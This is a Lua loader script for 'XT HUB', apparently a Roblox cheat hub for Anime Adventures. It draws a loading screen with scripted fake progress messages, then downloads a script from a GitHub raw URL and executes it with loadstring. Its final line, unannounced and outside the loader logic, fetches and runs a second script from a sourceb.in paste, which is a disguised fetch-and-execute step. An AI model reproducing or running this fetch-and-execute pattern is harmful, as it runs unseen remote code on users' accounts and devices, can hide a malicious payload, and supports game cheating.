-- XT HUB | ANIME ADVENTURES | BLACK EDITION

local P=game:GetService("Players").LocalPlayer
local T=game:GetService("TweenService")
local CP=game:GetService("ContentProvider")
local URL="https://raw.githubusercontent.com/weziiotez-dev/xt-hub/main/crazy.lua"
local DISCORD="https://discord.gg/AUqahYX74"

local G=Instance.new("ScreenGui")
G.Name="XTLoading"
G.ResetOnSpawn=false
G.IgnoreGuiInset=true
G.Parent=P:WaitForChild("PlayerGui")

local M=Instance.new("Frame",G)
M.Size=UDim2.fromOffset(760,630)
M.Position=UDim2.fromScale(.5,.5)
M.AnchorPoint=Vector2.new(.5,.5)
M.BackgroundColor3=Color3.fromRGB(7,7,12)
M.BorderSizePixel=0
Instance.new("UICorner",M).CornerRadius=UDim.new(0,20)

local S=Instance.new("UIStroke",M)
S.Color=Color3.fromRGB(90,55,170)
S.Thickness=1.5

local Z=Instance.new("UIScale",M)
local function resize()
    local cam=workspace.CurrentCamera
    if cam then
        local v=cam.ViewportSize
        Z.Scale=math.clamp(math.min(v.X/820,v.Y/680),.45,1)
    end
end
resize()
if workspace.CurrentCamera then
    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(resize)
end

local function label(parent,txt,pos,size,color,bold)
    local x=Instance.new("TextLabel",parent)
    x.BackgroundTransparency=1
    x.Text=txt
    x.Position=pos
    x.Size=size
    x.TextColor3=color or Color3.fromRGB(230,230,245)
    x.Font=bold and Enum.Font.GothamBold or Enum.Font.Gotham
    x.TextSize=15
    x.TextXAlignment=Enum.TextXAlignment.Left
    return x
end

-- HEADER
label(M,"XT",UDim2.fromOffset(38,48),UDim2.fromOffset(90,45),Color3.fromRGB(130,115,255),true).TextSize=35
label(M,"Opening Anime Adventures",UDim2.fromOffset(150,35),UDim2.fromOffset(450,35),Color3.fromRGB(245,245,255),true).TextSize=19
label(M,"XT HUB | V0.6.7",UDim2.fromOffset(150,72),UDim2.fromOffset(300,25),Color3.fromRGB(135,130,165)).TextSize=13

local Min=Instance.new("TextButton",M)
Min.Size=UDim2.fromOffset(48,48)
Min.Position=UDim2.new(1,-70,0,28)
Min.Text="—"
Min.TextColor3=Color3.fromRGB(190,180,230)
Min.BackgroundColor3=Color3.fromRGB(27,23,43)
Instance.new("UICorner",Min).CornerRadius=UDim.new(0,12)
Min.MouseButton1Click:Connect(function()
    M.Visible=false
end)

local Line=Instance.new("Frame",M)
Line.Position=UDim2.fromOffset(0,110)
Line.Size=UDim2.new(1,0,0,2)
Line.BackgroundColor3=Color3.fromRGB(100,65,190)
Line.BorderSizePixel=0

-- PROGRESS
label(M,"LOADING PROGRESS",UDim2.fromOffset(40,140),UDim2.fromOffset(300,25),Color3.fromRGB(150,145,185)).TextSize=14

local BG=Instance.new("Frame",M)
BG.Position=UDim2.fromOffset(40,185)
BG.Size=UDim2.new(1,-80,0,12)
BG.BackgroundColor3=Color3.fromRGB(35,32,49)
BG.BorderSizePixel=0
Instance.new("UICorner",BG).CornerRadius=UDim.new(1,0)

local Bar=Instance.new("Frame",BG)
Bar.Size=UDim2.fromScale(0,1)
Bar.BackgroundColor3=Color3.fromRGB(130,95,255)
Bar.BorderSizePixel=0
Instance.new("UICorner",Bar).CornerRadius=UDim.new(1,0)

local Status=label(M,"Initializing XT HUB...",UDim2.fromOffset(40,215),UDim2.new(1,-80,0,28),Color3.fromRGB(165,160,200))

-- ACTIVITY
label(M,"ACTIVITY",UDim2.fromOffset(40,265),UDim2.fromOffset(300,25),Color3.fromRGB(150,145,185)).TextSize=14

local Panel=Instance.new("Frame",M)
Panel.Position=UDim2.fromOffset(40,300)
Panel.Size=UDim2.new(1,-80,0,200)
Panel.BackgroundColor3=Color3.fromRGB(17,16,27)
Panel.BorderSizePixel=0
Panel.ClipsDescendants=true
Instance.new("UICorner",Panel).CornerRadius=UDim.new(0,12)
Instance.new("UIStroke",Panel).Color=Color3.fromRGB(42,37,65)

local List=Instance.new("UIListLayout",Panel)
List.Padding=UDim.new(0,10)

local Pad=Instance.new("UIPadding",Panel)
Pad.PaddingTop=UDim.new(0,14)
Pad.PaddingLeft=UDim.new(0,17)

local function activity(msg,ok)
    local c=ok and Color3.fromRGB(100,220,160) or Color3.fromRGB(180,175,205)
    label(Panel,msg,UDim2.new(),UDim2.new(1,-25,0,22),c).TextSize=13
end

-- DISCORD
label(M,"XT HUB COMMUNITY",UDim2.fromOffset(40,515),UDim2.fromOffset(250,22),Color3.fromRGB(160,145,210),true).TextSize=13

local DiscordBox=Instance.new("TextBox",M)
DiscordBox.Position=UDim2.fromOffset(40,545)
DiscordBox.Size=UDim2.new(1,-190,0,48)
DiscordBox.BackgroundColor3=Color3.fromRGB(22,20,34)
DiscordBox.Text=DISCORD
DiscordBox.TextColor3=Color3.fromRGB(190,180,230)
DiscordBox.TextSize=13
DiscordBox.Font=Enum.Font.Gotham
DiscordBox.ClearTextOnFocus=false
DiscordBox.TextEditable=true
DiscordBox.TextXAlignment=Enum.TextXAlignment.Center
Instance.new("UICorner",DiscordBox).CornerRadius=UDim.new(0,10)

local Copy=Instance.new("TextButton",M)
Copy.Position=UDim2.new(1,-135,0,545)
Copy.Size=UDim2.fromOffset(95,48)
Copy.BackgroundColor3=Color3.fromRGB(85,55,155)
Copy.Text="COPY"
Copy.TextColor3=Color3.new(1,1,1)
Copy.Font=Enum.Font.GothamBold
Copy.TextSize=13
Instance.new("UICorner",Copy).CornerRadius=UDim.new(0,10)

Copy.MouseButton1Click:Connect(function()
    if typeof(setclipboard)=="function" then
        local ok=pcall(setclipboard,DISCORD)
        Copy.Text=ok and "COPIED!" or "SELECT LINK"
    else
        DiscordBox:CaptureFocus()
        DiscordBox.CursorPosition=#DISCORD+1
        Copy.Text="SELECT LINK"
    end
    task.wait(1.5)
    Copy.Text="COPY"
end)

local function progress(n,msg)
    Status.Text=msg
    T:Create(Bar,TweenInfo.new(.5),{
        Size=UDim2.fromScale(n,1)
    }):Play()
end

local function stage(msg,n)
    activity("• "..msg)
    progress(n,msg)
    task.wait(5)
end

-- LOADING AND AUTO START
local success,err=pcall(function()
    activity("XT HUB loader initialized")

    stage("Waiting for Character...",.15)
    local C=P.Character or P.CharacterAdded:Wait()
    C:WaitForChild("Humanoid")
    activity("✓ Character successfully loaded",true)

    stage("Preloading Assets...",.40)
    local assets={}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("Decal") or v:IsA("Texture")
        or v:IsA("ImageLabel") or v:IsA("ImageButton")
        or v:IsA("Sound") then
            table.insert(assets,v)
        end
    end
    pcall(function()
        CP:PreloadAsync(assets)
    end)
    activity("✓ Assets preload finished",true)

    stage("Setting up XT HUB...",.65)
    activity("✓ Setup completed",true)

    progress(.85,"Waiting for XT to respond...")
    activity("• Waiting for XT to respond...")
    task.wait(3)

    progress(.95,"Starting XT HUB...")
    activity("• Starting main script...")
    task.wait(2)

    local source=game:HttpGet(URL)
    assert(type(source)=="string" and #source>0,"Empty script")

    local execute=loadstring(source)
    assert(type(execute)=="function","Script compilation failed")
    execute()

    progress(1,"XT HUB started!")
    activity("✓ Script execution returned",true)
    task.wait(1.5)
    G:Destroy()
end)

loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FxMgivPRlF/0"))()
